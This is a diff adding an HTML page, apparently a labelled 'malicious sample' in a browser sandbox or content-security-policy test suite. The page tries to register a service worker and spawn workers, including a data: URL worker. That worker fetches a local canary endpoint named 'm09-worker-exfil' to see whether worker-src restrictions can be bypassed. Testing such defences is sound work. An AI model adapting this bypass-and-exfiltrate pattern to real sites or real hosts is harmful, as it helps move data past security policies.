@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<title>m09-workers Worker 與 SW</title>
+</head>
+<body>
+<main><h1>m09-workers</h1><p>malicious sample（Worker 與 SW）</p></main>
+<script type="module">
+
+const DEF = { canaryHttp: "http://127.0.0.1:8873", canaryUdpPort: 8874, mainOrigin: "http://localhost:8871", navTarget: "http://127.0.0.1:8873/nav", mode: "real" };
+const T = Object.assign({}, DEF, (typeof window !== "undefined" && window.__pttTargets) || {});
+const C = T.canaryHttp;
+const DURATION = 10;
+const embedded = window.parent !== window;
+const mark = (k, v) => { try { document.body.dataset[k] = String(v); } catch {} };
+const render = (t) => { t = Math.max(0, Math.min(DURATION, Number(t) || 0)); try { document.body.dataset.t = String(t); } catch {} };
+addEventListener("message", (e) => { if (e.source !== window.parent) return; const m = e.data; if (!m || m.ptt !== 1 || m.type !== "seek" || typeof m.t !== "number" || !Number.isFinite(m.t)) return; render(m.t); });
+const sendReady = () => { if (embedded) { try { parent.postMessage({ ptt: 1, type: "ready", duration: DURATION }, "*"); } catch {} } };
+render(0);
+
+async function attack() {
+
+  try { if (navigator.serviceWorker) { navigator.serviceWorker.register("sw.js").then(() => mark("sw", "registered"), (e) => mark("sw", e.name)); mark("swTry", "1"); } else mark("sw", "no-api"); } catch (e) { mark("sw", e.name); }
+  try { const w = new Worker("worker.js"); mark("worker", "created"); w.terminate(); } catch (e) { mark("worker", e.name); }
+  // data: worker（worker-src 'none' 是否擋得住）；若建成，讓它實測能否對收件端送資料（判斷是純能力差異或真的旁路）
+  try {
+    const src = "self.onmessage=()=>{};" +
+      "try{ fetch(" + JSON.stringify(C + "/m09-worker-exfil") + ",{mode:'no-cors'}).then(()=>postMessage('fetched'),(e)=>postMessage('fetcherr:'+e.name)); }catch(e){ postMessage('fetchthrow:'+e.name); }";
+    const bw = new Worker("data:text/javascript," + encodeURIComponent(src));
+    bw.onmessage = (e) => mark("dataWorkerMsg", (document.body.dataset.dataWorkerMsg || "") + "|" + e.data);
+    bw.onerror = (e) => mark("dataWorkerErr", (e.message || "err"));
+    mark("dataWorker", "created");
+    setTimeout(() => { try { bw.terminate(); } catch {} }, 1200);
+  } catch (e) { mark("dataWorker", e.name); }
+}
+// 使用者啟用變體：測試會以真實滑鼠點擊 iframe，觸發需要啟用的攻擊（彈窗、對話框、下載、頂層導覽、權限）再跑一次
+document.addEventListener("click", () => { attack().catch((e) => mark("attackClickError", e && e.name)); });
+attack().catch((e) => mark("attackError", e && e.name)).finally(sendReady);
+</script>
+</body>
+</html>
